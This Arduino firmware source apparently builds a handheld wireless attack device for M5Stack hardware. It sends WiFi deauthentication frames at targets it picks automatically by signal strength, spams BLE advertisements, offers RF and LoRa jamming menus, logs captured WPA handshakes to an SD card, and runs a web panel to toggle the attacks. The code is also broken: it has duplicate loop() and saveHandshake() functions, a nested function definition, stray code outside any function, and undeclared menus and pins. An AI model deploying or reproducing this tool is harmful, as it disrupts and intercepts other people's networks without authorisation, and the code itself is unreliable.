#include <M5Core2.h>
#include <Wire.h>
#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include <SD.h>
#include <esp_wifi.h>
#include <BluetoothSerial.h>
#include <LoRa.h>
#include <M5StackMenuSystem.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// Define LED pins for status indications
#define LED_GREEN_PIN 25
#define LED_RED_PIN 26
#define LED_YELLOW_PIN 27
#define LED_BLUE_PIN 2

// Define the battery pin
#define BATTERY_PIN 36

// Battery level threshold for low battery indicator
#define BATTERY_LOW_THRESHOLD 3.3  // Low battery voltage threshold in volts

// Platform-specific includes
#ifdef ATOM_S3
#include <M5AtomS3.h>
#include <TFT_eSPI.h>
#else
#include <M5Core2.h>
#endif

#define DEAUTH_PACKET_RATE 100
#define CHANNEL_HOP_INTERVAL 2000

// Constants for system configuration
#define LORA_FREQUENCY 433E6

// Pins for LoRa
#define LORA_CS 5
#define LORA_RST 14
#define LORA_DIO0 26

// Global State
struct AttackState {
    bool wifiDeauth = false;
    bool bleSpam = false;
    bool rfActive = false;
    bool stealth = false;
    uint8_t wifiChannel = 1;
    uint8_t bleChannel = 37;
    String rfPayload = "";
    float batteryVoltage = 0.0;
    bool logDeauths = false;
} attackState;

struct JammingState {
    bool wifiJamming = false;
    bool bleJamming = false;
    bool rfJamming = false;
} jammingState;

// Display Wrapper Class

class StatusDisplay {
public:
    void begin() {
        #ifdef ATOM_S3
        M5.begin(true, false, true);
        tft.init();
        tft.setRotation(1);
        tft.fillScreen(TFT_BLACK);
        #else
        M5.begin();
        M5.Lcd.setRotation(1);
        #endif
    }

    void clear() {
        #ifdef ATOM_S3
        tft.fillScreen(TFT_BLACK);
        #else
        M5.Lcd.fillScreen(TFT_BLACK);
        #endif
    }

    void text(const String &msg, int x, int y, int size=1, uint16_t color=TFT_WHITE) {
        #ifdef ATOM_S3
        tft.setTextSize(size);
        tft.setTextColor(color);
        tft.setCursor(x, y);
        tft.print(msg);
        #else
        M5.Lcd.setTextSize(size);
        M5.Lcd.setTextColor(color);
        M5.Lcd.setCursor(x, y);
        M5.Lcd.print(msg);
        #endif
    }

    #ifdef ATOM_S3
    TFT_eSPI tft = TFT_eSPI();
    #endif
};

StatusDisplay display;

// ======================== Deauth Manager ========================
class DeauthManager {
    private:
        uint8_t targetAP[6] = {0};     // Current AP target
        uint8_t targetClient[6] = {0}; // Current client target
        bool autoMode = true;          // Auto-select targets
        unsigned long lastDeauthTime = 0; // Timing control
    public:
         bool isAutoMode() const { return autoMode; }  // ✅ Add `const`
         void setTargets(const uint8_t* ap, const uint8_t* client) {
            memcpy(targetAP, ap, 6);
            memcpy(targetClient, client, 6);
            autoMode = false; // Switch to manual mode
        }
    
        void enableAutoMode() {
            autoMode = true;
            scanNetworks();
        }
    
        void updateTargets() {
            if (autoMode) {
                selectStrongestTargets(); // Automatically pick the best AP and client
            }
        }
    
        void sendDeauth() {
             if (millis() - lastDeauthTime < DEAUTH_PACKET_RATE) return; // ✅ Timing Fix
             if (memcmp(targetAP, "\0\0\0\0\0\0", 6) != 0) {
                uint8_t packet[26] = {0xC0, 0x00, 0x00, 0x00};
                memcpy(packet + 4, targetClient, 6);
                memcpy(packet + 10, targetAP, 6);
                setChannel(attackState.wifiChannel); // ✅ Ensure correct channel before sending
                esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);  

        lastDeauthTime = millis();  // ✅ Update last send time

        if (result == ESP_OK) {
            if (attackState.logDeauths) { // ✅ Log only if enabled in menu
                String logEntry = "✅ Deauth Sent → AP: " + formatMAC(targetAP) + " | Client: " + formatMAC(targetClient);
                Serial.println(logEntry);
                logData(logEntry); // ✅ Save to SD if enabled
            }
        } else {
            Serial.println("❌ ERROR: Deauth FAILED!");
            if (attackState.logDeauths) logData("❌ ERROR: Deauth FAILED!");
        }
    }
}
            } 
        
    
        void scanNetworks() {
            WiFi.scanNetworks(true); // Async scan
        }
    
        void selectStrongestTargets() {
            int bestRSSI = -100;
            int bestAPIndex = -1;
            int bestClientIndex = -1;
    
            int numNetworks = WiFi.scanComplete();
            if (numNetworks == WIFI_SCAN_RUNNING) return;
            if (numNetworks == WIFI_SCAN_FAILED || numNetworks == 0) {
                Serial.println("No networks found!");
                return;
            }
    
            for (int i = 0; i < numNetworks; i++) {
                int rssi = WiFi.RSSI(i);
                if (rssi > bestRSSI) {
                    bestRSSI = rssi;
                    bestAPIndex = i;
                }
            }
    
            if (bestAPIndex != -1) {
                String bestBSSID = WiFi.BSSIDstr(bestAPIndex);
                parseMAC(bestBSSID, targetAP);
                Serial.print("Selected AP: "); Serial.println(bestBSSID);
            }
    
            bestRSSI = -100;
            for (int i = 0; i < numNetworks; i++) {
                if (i != bestAPIndex) {
                    int rssi = WiFi.RSSI(i);
                    if (rssi > bestRSSI) {
                        bestRSSI = rssi;
                        bestClientIndex = i;
                    }
                }
            }
    
            if (bestClientIndex != -1) {
                String bestClientMAC = WiFi.BSSIDstr(bestClientIndex);
                parseMAC(bestClientMAC, targetClient);
                Serial.print("Selected Client: "); Serial.println(bestClientMAC);
            }
    
            Serial.println("Auto-selection complete.");
        }
        private:
        void setChannel(uint8_t ch) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        }
    };
    
    
    DeauthManager deauthEngine;   
    
   // Menu System
    MenuSystem menuSystem;
    Menu *mainMenu, *wifiMenu, *btMenu, *rfMenu,  *jammingMenu,*targetMenu,*settingsMenu;

   // Web Server
  WebServer server(80);
 const char* AP_SSID = "KOBEPOWER_CTRL";
 const char* AP_PASS = "kobe1984";

// Prototypes
void setupPeripherals();
void setupNetworking();
void handleButtons();
void updateDisplayAndLEDs();
void channelHop();
void wifiSniffer(void* buf, wifi_promiscuous_pkt_type_t type);
void bleAdvertise();
void basketballBootAnimation();
void checkBattery();
void shutdownRadios();
void cycleWifiChannel();
void wifiDeauthJamming();
void bleFloodJamming();
void rfNoiseJamming();

// ======================== Core Functions ========================
void setup() {
    Serial.begin(115200);
    esp_wifi_set_promiscuous(true); // Enable promiscuous mode
    esp_wifi_set_promiscuous_rx_cb(&wifiSniffer);
    #ifdef ATOM_S3
    SPI.begin(3, 37, 35, 12); // SCLK, MISO, MOSI, SS
    #else
    M5.begin();
    #endif
    pinMode(LED_RED_PIN, OUTPUT); // Set the LED pin as an output
    // pinMode(BATTERY_PIN, INPUT); // Uncomment if you need to set the battery pin as input, usually not needed for analog pins
      digitalWrite(LED_RED_PIN, LOW); // Ensure the LED is off when starting up

    setupPeripherals();
    setupNetworking();
    setupMenuSystem();
    basketballBootAnimation();  // 🏀 Show boot animation

    drawSoftButtons(); // ✅ Draw touchscreen buttons

    esp_wifi_set_promiscuous_rx_cb(&wifiSniffer);
}

void loop() {
    server.handleClient();
    M5.update();
    handleButtons();
    updateDisplayAndLEDs();
    channelHop();

    if (attackState.wifiDeauth) wifiDeauthJamming();
    if (attackState.bleSpam) bleAdvertise();

    checkBattery(); // Check battery status and handle low power scenario
    delay(10);
}
void checkBattery() {
    int raw = analogRead(BATTERY_PIN); // Read the raw analog value from battery pin
    attackState.batteryVoltage = (raw / 4095.0) * 7.05; // Convert raw value to actual voltage

    if (attackState.batteryVoltage < BATTERY_LOW_THRESHOLD) {
        digitalWrite(LED_RED_PIN, HIGH); // Turn on RED LED to indicate low battery

        // 🚨 Stop Deauth Attacks if battery is too low
        if (attackState.wifiDeauth) {
            attackState.wifiDeauth = false; // Force stop
            Serial.println("⚠️ WARNING: Low Battery! Deauth Stopped.");
            
            display.clear();
            display.text("⚠️ LOW BATTERY!", 10, 40, 3, TFT_RED);
            display.text("Deauth Disabled", 10, 70, 2, TFT_WHITE);
            delay(2000); // Show warning briefly
            display.clear();
        }
        // ✅ Shut down unused radios when battery is too low
        shutdownRadios(); // 🛑 This turns off WiFi, BLE, and LoRa if not in use

        Serial.println("⚠️ Low Battery - Please Charge");
    } else {
        digitalWrite(LED_RED_PIN, LOW); // Ensure RED LED is off if battery level is fine
    }
}
// ======================== Power Management Functions ========================
// ✅ Auto Shutdown Radios to Save Power

void autoShutdownRadios() {
    static unsigned long lastCheck = 0;
    if (millis() - lastCheck < 10000) return;  // ✅ Check every 10 seconds

    Serial.println("⚡ Checking for inactive radios...");

    if (!attackState.wifiDeauth && WiFi.getMode() != WIFI_OFF) {
        WiFi.mode(WIFI_OFF); // ✅ Turn off WiFi if not in use
        Serial.println("🚫 WiFi turned off to save power.");
    }

    if (!attackState.bleSpam && BLEDevice::getInitialized()) {
        BLEDevice::deinit(); // ✅ Turn off BLE if not in use
        Serial.println("🚫 BLE turned off to save power.");
    }

    if (!attackState.rfActive) {
        LoRa.sleep(); // ✅ Put LoRa into sleep mode
        Serial.println("💤 LoRa put into sleep mode.");
    }

    lastCheck = millis();  // ✅ Update last check time
}

        

// ======================== Enhanced Features ========================

   void bleAdvertise() {
    static unsigned long lastChange = 0;
    if (millis() - lastChange < 500) return;

    BLEDevice::stopAdvertising();
    BLEAdvertisementData advert;
    delay (50); // Small delay to ensure BLE ad stops
    
    // Generate random payload
    String payload = "KOBE";
    for (int i = 0; i < 4; i++) payload += (char)random(0x20, 0x7E);

    advert.setManufacturerData(String(random(0xFFFF)));
    advert.setName(payload.c_str());

    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
    pAdv->setAdvertisementData(advert);
    pAdv->start();

    lastChange = millis();
}
void channelHop() {
    static unsigned long lastHop = 0;
    if (millis() - lastHop < CHANNEL_HOP_INTERVAL) return;

    // WiFi channel hopping (1-14)
    attackState.wifiChannel = (attackState.wifiChannel % 14) + 1;
    esp_wifi_set_channel(attackState.wifiChannel, WIFI_SECOND_CHAN_NONE);

    // BLE channel hopping (37, 38, 39)
    attackState.bleChannel = 37 + (random(0, 3));

    BLEDevice::setAdvertisingChannel(attackState.bleChannel);
    lastHop = millis();
}
// ======================== Menu System Setup ========================
void setupMenuSystem() {
    mainMenu = new Menu("Main Menu");
    wifiMenu = new Menu("WiFi Attacks");
    btMenu = new Menu("BT Attacks");
    rfMenu = new Menu("RF433 Tools");
    settingsMenu = new Menu("Settings");
    jammingMenu = new Menu("Jamming Tools");
    sdMenu = new Menu("SD Card Tools");
    // Main Menu Items
    mainMenu->addItem("WiFi Tools", []() { menuSystem.pushMenu(wifiMenu); });
    mainMenu->addItem("BT Tools", []() { menuSystem.pushMenu(btMenu); });
    mainMenu->addItem("RF433 Tools", []() { menuSystem.pushMenu(rfMenu); });
    mainMenu->addItem("Jamming Tools", []() { menuSystem.pushMenu(jammingMenu); });
    mainMenu->addItem("Settings", []() { menuSystem.pushMenu(settingsMenu); });

    // WiFi Menu
    wifiMenu->addItem("Deauth Attack", []() { attackState.wifiDeauth ^= 1; });
    wifiMenu->addItem("Sniff Packets", []() { /* Packet sniff logic */ });
    wifiMenu->addItem("Target Selection", []() { menuSystem.pushMenu(targetMenu); });
    wifiMenu->addItem("Log Deauths", []() { attackState.logDeauths ^= 1; });
    wifiMenu->addItem("Back", []() { menuSystem.popMenu(); });
      
    // Create Target Selection Submenu
       targetMenu->addItem("Auto-Select Targets", []() { deauthEngine.enableAutoMode(); });
       targetMenu->addItem("Manual Target Entry", []() { enterManualMAC(); });
       targetMenu->addItem("Back", []() { menuSystem.popMenu(); });

    // BT Menu
    btMenu->addItem("BLE Spam", []() { attackState.bleSpam ^= 1; });
    btMenu->addItem("Device Scan", []() { /* Scan logic */ });
    btMenu->addItem("Back", []() { menuSystem.popMenu(); });

    // RF433 Menu
    rfMenu->addItem("Capture Signal", []() { attackState.rfActive = true; });
    rfMenu->addItem("Replay Signal", []() { /* Replay logic */ });
    rfMenu->addItem("Back", []() { menuSystem.popMenu(); });

    // Jamming Menu
    jammingMenu->addItem("WiFi Deauth", []() { attackState.wifiDeauth ^= 1; });
    jammingMenu->addItem("BLE Flood", []() { attackState.bleSpam ^= 1; });
    jammingMenu->addItem("RF Noise", []() { attackState.rfActive ^= 1; });
    jammingMenu->addItem("Back", []() { menuSystem.popMenu(); });

    // Settings Menu
    settingsMenu->addItem("Toggle Stealth", []() { attackState.stealth ^= 1; });
    settingsMenu->addItem("Toggle Deauth Logging", []() { 
        attackState.logDeauths = !attackState.logDeauths; 
        Serial.print("Deauth Logging: "); 
        Serial.println(attackState.logDeauths ? "ON" : "OFF"); 
    });
    settingsMenu->addItem("Factory Reset", []() { /* Reset logic */ });
    settingsMenu->addItem("Back", []() { menuSystem.popMenu(); });
    // SD Card Menu
    sdMenu->addItem("View Logs", []() { viewLogs(); });
    sdMenu->addItem("Delete Logs", []() { deleteLogs(); });
    sdMenu->addItem("View Handshakes", []() { listHandshakes(); });
    sdMenu->addItem("Toggle SD Logging", []() { toggleSDLogging(); });
    sdMenu->addItem("Back", []() { menuSystem.popMenu(); });
    
    settingsMenu->addItem("SD Card Tools", []() { menuSystem.pushMenu(sdMenu); });
    menuSystem.setRootMenu(mainMenu);
}
// ======================== ATOM S3 Specific Additions ========================
#ifdef ATOM_S3
void handleAtomS3Input() {
    static unsigned long pressStart = 0;

    if (M5.Btn.wasPressed()) {
        pressStart = millis();
    }

    if (M5.Btn.wasReleased()) {
        if (millis() - pressStart < 1000) {
            // Short press - select menu
            menuSystem.select();
        } else {
            // Long press - back
            menuSystem.back();
        }
    }

    // Simulate encoder with accelerometer
    static float lastY = 0;
    float currentY = M5.Imu.getAccY();
    if (currentY > lastY + 0.5) menuSystem.next();
    if (currentY < lastY - 0.5) menuSystem.prev();
    lastY = currentY;
}
#endif
// ======================== Hardware Control ========================
void setupPeripherals() {
    // SD Card
    if (!SD.begin(SD_CS)) {
        display.text("SD Error!", 10, 10, 2, TFT_RED);
        delay(2000);
    }

    // LoRa Initialization
    LoRa.setPins(LORA_CS, LORA_RST, LORA_DIO0);
    if (!LoRa.begin(433E6)) {
        display.text("LoRa Error!", 10, 30, 2, TFT_RED);
        delay(2000);
    }

    // Button callbacks
    #ifdef ATOM_S3
        // ATOM S3 uses simulated encoder
    #else
    void handleTouchInput() {
        if (M5.Touch.ispressed()) {
            TouchPoint_t touch = M5.Touch.getPressPoint();
    
            // Left button (Back)
            if (touch.x > 0 && touch.x < 100 && touch.y > 200) {
                menuSystem.back();
            }
            // Middle button (Emergency Stop)
            else if (touch.x > 100 && touch.x < 220 && touch.y > 200) {
                emergencyKillSwitch();
            }
            // Right button (Select)
            else if (touch.x > 220 && touch.x < 320 && touch.y > 200) {
                menuSystem.select();
            }
        }
    }
    
    #endif
}

void handleButtons() {
    #ifdef ATOM_S3
        handleAtomS3Input(); // ✅ Keep Atom S3 Encoder Handling
    #else
        M5.update();  // ✅ Required to update touchscreen events

        if (M5.Touch.getCount() > 0) {  // ✅ Check if screen is touched
            TouchPoint_t touch = M5.Touch.getPressPoint();

            if (touch.x < 100) {  
                menuSystem.back();  // 🔙 Left side → "Back"
            } else if (touch.x > 220) {  
                menuSystem.select(); // ✅ Right side → "Select"
            } else {  
                emergencyKillSwitch(); // 🚨 Middle tap → Kill Switch
            }
        }
    #endif
}

// ======================== Additional Network and Hardware Functions ========================
void setupNetworking() {
    WiFi.softAP(AP_SSID, AP_PASS);
    WiFi.mode(WIFI_AP_STA);

    // Platform-specific power adjustments
    #ifdef ATOM_S3
    WiFi.setTxPower(WIFI_POWER_8_5dBm);  // Lower power for compact device
    #else
    WiFi.setTxPower(WIFI_POWER_19_5dBm); // Full power for Core2
    #endif

    // Web Server Endpoints
    server.on("/", handleRoot);
    server.on("/deauth", HTTP_GET, handleDeauth);
    server.on("/status", HTTP_GET, handleStatus);
    server.on("/reboot", HTTP_GET, handleReboot);

    server.begin();

    // Start captive portal redirection
    server.onNotFound([]() {
        server.sendHeader("Location", "http://" + WiFi.softAPIP().toString(), true);
        server.send(302, "text/plain", "");
    });
}

void handleRoot() {
    String html = "<!DOCTYPE html><html><head><title>KOBEPOWER Control</title></head><body>";
    html += "<h1>KOBEPOWER v1.6</h1>";
    html += "<p>Device Status: <strong>" + String(ATOM_S3 ? "ATOM S3" : "Core2") + "</strong></p>";
    html += "<p>Deauth Status: <span style='color:" + String(attackState.wifiDeauth ? "red'>ACTIVE" : "green'>INACTIVE") + "</span></p>";
    html += "<p><a href='/deauth'>Toggle Deauth</a></p>";
    html += "<p><a href='/status'>System Status</a></p>";
    html += "</body></html>";

    server.send(200, "text/html", html);
}   void handleReboot() {
    server.send(200, "text/plain", "Rebooting...");
    delay(100); // Short delay before rebooting
    ESP.restart(); // Command to restart the ESP32
}


// Additional endpoint handlers
void handleDeauth() {
    attackState.wifiDeauth = !attackState.wifiDeauth;
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
}

void handleStatus() {
    String json = "{";
    json += "\"wifi_deauth\":" + String(attackState.wifiDeauth) + ",";
    json += "\"ble_spam\":" + String(attackState.bleSpam) + ",";
    json += "\"rf_active\":" + String(attackState.rfActive) + ",";
    json += "\"stealth_mode\":" + String(attackState.stealth) + ",";
    json += "\"battery_voltage\":" + String(attackState.batteryVoltage);
    json += "}";

    server.send(200, "application/json", json);
}

// ======================== Display Functions ========================
void basketballBootAnimation() {
    display.clear();
    #ifdef ATOM_S3
        // Simple animation for ATOM S3
        for(int i=0; i<3; i++) {
            display.text("KOBE", 40, 50, 2, TFT_ORANGE);
            delay(300);
            display.clear();
            delay(300);
        }
    #else
        M5.Lcd.drawJpgFile(SD, "/logo.jpg", 0, 0);
        delay(2000);
    #endif
    display.clear();
}
void updateDisplay() {
    display.clear();
    #ifdef ATOM_S3
    display.text(menuSystem.getCurrentMenu()->getTitle(), 5, 5, 1);
    String status = String(attackState.wifiDeauth ? "[W]" : " W ") + " " +
                    String(attackState.bleSpam ? "[B]" : " B ") + " " +
                    String(attackState.rfActive ? "[R]" : " R ") + " " +
                    String(attackState.batteryVoltage < BATTERY_LOW_THRESHOLD ? "[LOW BATTERY]" : "");
    display.text(status, 5, 110, 2);
    #else
    M5.Lcd.setTextSize(2);
    M5.Lcd.println(menuSystem.getCurrentMenu()->getTitle());
    M5.Lcd.setTextSize(1);
    M5.Lcd.println("\nWiFi: " + String(attackState.wifiDeauth ? "DEAUTH" : "IDLE"));
    M5.Lcd.println("BLE: " + String(attackState.bleSpam ? "SPAM" : "IDLE"));
    M5.Lcd.println("RF433: " + String(attackState.rfActive ? "ACTIVE" : "IDLE"));
    M5.Lcd.println("Battery: " + String(attackState.batteryVoltage) + "V");
    #endif
}
// ✅ Add this function here!
void drawSoftButtons() {
    // Left button (Back)
    M5.Lcd.fillRect(0, 200, 100, 40, TFT_RED);
    M5.Lcd.setTextColor(TFT_WHITE);
    M5.Lcd.drawString("Back", 30, 220, 2);

    // Middle button (Emergency Stop)
    M5.Lcd.fillRect(100, 200, 120, 40, TFT_ORANGE);
    M5.Lcd.setTextColor(TFT_WHITE);
    M5.Lcd.drawString("STOP!", 140, 220, 2);

    // Right button (Select)
    M5.Lcd.fillRect(220, 200, 100, 40, TFT_GREEN);
    M5.Lcd.setTextColor(TFT_WHITE);
    M5.Lcd.drawString("Select", 250, 220, 2);
}

void loop() {
    server.handleClient();
    M5.update();
    handleTouchInput();  // ✅ Call the function here!
    handleButtons();     // ✅ Keep the encoder handler for ATOM S3
    updateDisplayAndLEDs();
    channelHop();

    if (attackState.wifiDeauth) wifiDeauthJamming();
    if (attackState.bleSpam) bleAdvertise();

    checkBattery();
    delay(10);
}
// ✅ Add status in the top-right corner
   M5.Lcd.setTextSize(2);
   M5.Lcd.setCursor(200, 10);  // Top-right corner position
   if (deauthEngine.isAutoMode()) {
    M5.Lcd.setTextColor(TFT_GREEN);  
    M5.Lcd.print("Auto Mode Active");
} else {
    M5.Lcd.setTextColor(TFT_RED);  
    M5.Lcd.print("Manual Target Set");
}

// ✅ Reset text color to default
M5.Lcd.setTextColor(TFT_WHITE); 
// ======================== Emergency Functions ========================
void emergencyKillSwitch() {
    attackState = {false, false, false, false, 1, 37, ""};
    esp_wifi_stop();
    BLEDevice::deinit();
    LoRa.end();
    
    // 🚨 Immediate visual warning (Red LED on)
    digitalWrite(LED_RED_PIN, HIGH);
    
    // Display emergency warning
    display.clear();
    display.text("EMERGENCY STOP!", 10, 40, 3, TFT_RED);
    display.text("All attacks stopped.", 10, 70, 2, TFT_WHITE);

    Serial.println("🚨 Emergency Kill Switch Activated!");
    delay(2000);  // Keep the message on-screen briefly
    
    #ifdef ATOM_S3
        display.clear();
        display.text("EMERGENCY", 15, 40, 2, TFT_RED);
        display.text("STOP!", 35, 70, 2, TFT_RED);
        M5.dis.drawpix(0, 0xFF0000); // Red LED
    #else
        M5.Lcd.fillScreen(TFT_RED);
        M5.Lcd.setTextSize(2);
        M5.Lcd.println("EMERGENCY STOP!");
    #endif

    delay(1000);
    updateDisplay();
}

// ======================== SD Card Handling ========================
bool enableSDLogging = true; // Toggle for enabling/disabling SD logging

void logData(String data) {
    if (!enableSDLogging) return; // ✅ Check if logging is enabled

    #ifdef ATOM_S3
    SPI.begin(3, 37, 35, 12); // SCLK, MISO, MOSI, SS
    #endif

    if (SD.begin(SD_CS)) {
        File file = SD.open("/logs.txt", FILE_APPEND);
        if (file) {
            file.println("[" + String(millis()) + "] " + data);
            file.close();
        }
    }

    #ifdef ATOM_S3
    SPI.end(); // Release SPI bus for other peripherals
    #endif
}

// ✅ Save Handshakes to SD Card
void saveHandshake(const uint8_t* handshakeData, size_t length) {
    if (!enableSDLogging) return;

    if (SD.begin(SD_CS)) {
        File file = SD.open("/handshakes.txt", FILE_APPEND);
        if (file) {
            file.print("[");
            file.print(millis());
            file.print("] Handshake Captured: ");
            for (size_t i = 0; i < length; i++) {
                file.printf("%02X ", handshakeData[i]);
            }
            file.println();
            file.close();
            Serial.println("✅ Handshake saved to SD.");
        } else {
            Serial.println("❌ ERROR: Failed to save handshake!");
        }
    } else {
        Serial.println("❌ ERROR: SD Card not found!");
    }
}

// ✅ Log RF Jamming Success
void logRFJamSuccess() {
    if (!enableSDLogging) return;

    if (SD.begin(SD_CS)) {
        File file = SD.open("/rf_jam_log.txt", FILE_APPEND);
        if (file) {
            file.print("[");
            file.print(millis());
            file.println("] ✅ RF Jamming Success!");
            file.close();
            Serial.println("✅ RF Jam Success Logged!");
        } else {
            Serial.println("❌ ERROR: Could not write RF Jam log!");
        }
    } else {
        Serial.println("❌ ERROR: SD Card Not Found!");
    }
}

// ✅ View Logs from SD
void viewLogs() {
    if (SD.begin(SD_CS)) {
        File file = SD.open("/logs.txt", FILE_READ);
        if (file) {
            Serial.println("📜 SD Logs:");
            while (file.available()) {
                Serial.write(file.read()); // Print log contents
            }
            file.close();
        } else {
            Serial.println("❌ ERROR: No logs found!");
        }
    } else {
        Serial.println("❌ ERROR: SD Card Not Found!");
    }
}

// ✅ Delete SD Logs
void deleteLogs() {
    if (SD.begin(SD_CS)) {
        if (SD.exists("/logs.txt")) {
            SD.remove("/logs.txt");
            Serial.println("🗑 Logs deleted!");
        } else {
            Serial.println("❌ ERROR: No logs to delete!");
        }
    } else {
        Serial.println("❌ ERROR: SD Card Not Found!");
    }
}

// ✅ List Handshakes from SD
void listHandshakes() {
    if (SD.begin(SD_CS)) {
        File file = SD.open("/handshakes.txt", FILE_READ);
        if (file) {
            Serial.println("📜 Saved Handshakes:");
            while (file.available()) {
                Serial.write(file.read()); // Print handshake contents
            }
            file.close();
        } else {
            Serial.println("❌ ERROR: No handshakes saved!");
        }
    } else {
        Serial.println("❌ ERROR: SD Card Not Found!");
    }
}

// ✅ SD Logging Toggle
void toggleSDLogging() {
    enableSDLogging = !enableSDLogging;
    Serial.println(enableSDLogging ? "✅ SD Logging Enabled" : "🚫 SD Logging Disabled");
}


// ======================== Save Handshake ========================
void saveHandshake(const uint8_t* data, size_t len) {
    if(SD.begin(SD_CS)) {
        File file = SD.open("/handshakes.cap", FILE_APPEND);
        if(file) {
            file.write(data, len); // Save raw handshake packet data
            file.close();
            Serial.println("✅ Handshake saved to SD!");
        } else {
            Serial.println("❌ ERROR: Failed to save handshake!");
        }
    } else {
        Serial.println("❌ ERROR: SD card not initialized!");
    }
}

// ======================== Log RF Jamming Result ========================
void logRFJamming(bool success) {
    String logEntry = success ? "✅ RF Jamming SUCCESS" : "❌ RF Jamming FAILED";
    logData(logEntry);  // Use the existing logData() function to save to logs.txt
}

// ======================== Packet Handlers ========================
void wifiSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type == WIFI_PKT_MGMT && attackState.wifiDeauth) {
        wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
        String logEntry = "WiFi Frame - Channel:";
        logEntry += attackState.wifiChannel;
        logEntry += " RSSI:";
        logEntry += pkt->rx_ctrl.rssi;

        #ifdef ATOM_S3
            // Compact logging for ATOM S3
            logData(logEntry.substring(0, 30)); 
        #else
            logData(logEntry);
        #endif
    }
}

void onBLEScanResult(BLEAdvertisedDevice device) {
    String result = "BLE: ";
    result += device.getAddress().toString().c_str();
    result += " (";
    result += device.getRSSI();
    result += "dBm)";

    Serial.println(result);

    #ifdef ATOM_S3
        // Limited BLE logging for ATOM S3
        if(SD.exists("/ble_log.txt")) {
            logData(result.substring(0, 25));
        }
    #else
        logData(result);
    #endif
}
// ======================== MAC Address Utilities ========================

// Validate if the MAC address is in the correct format
bool isValidMAC(String mac) {
    // MAC format must be 17 characters (XX:XX:XX:XX:XX:XX)
    if (mac.length() != 17) return false;

    for (int i = 0; i < mac.length(); i++) {
        if (i % 3 == 2) {
            if (mac[i] != ':') return false; // Every third character must be ':'
        } else {
            if (!isxdigit(mac[i])) return false; // Must be a valid hex digit
        }
    }
    return true;
}

// Convert MAC string to uint8_t array
void parseMAC(const String& mac, uint8_t* output) {
    uint8_t values[6];
    // Ensure MAC is properly formatted (e.g., "AA:BB:CC:DD:EE:FF" or "aa:bb:cc:dd:ee:ff")
    if (sscanf(mac.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        memcpy(output, values, 6); // Efficient copy
    } else {
        Serial.println("❌ ERROR: Invalid MAC address format!");
        memset(output, 0, 6); // Optional: Clear output on failure for safety
    }
}



void enterManualMAC() {
    Serial.println("Enter Target MAC Address (AP and Client):");

    String apMac, clientMac;
    Serial.print("AP MAC: ");
    while (!Serial.available()) { delay(10); }
    apMac = Serial.readStringUntil('\n');
    
    Serial.print("Client MAC: ");
    while (!Serial.available()) { delay(10); }
    clientMac = Serial.readStringUntil('\n');

    // Validate and set targets
    if (isValidMAC(apMac) && isValidMAC(clientMac)) {
        uint8_t ap[6], client[6];
        parseMAC(apMac, ap);
        parseMAC(clientMac, client);
        deauthEngine.setTargets(ap, client);
        Serial.println("Targets Updated!");
    } else {
        Serial.println("Invalid MAC format! Try again.");
    }
}
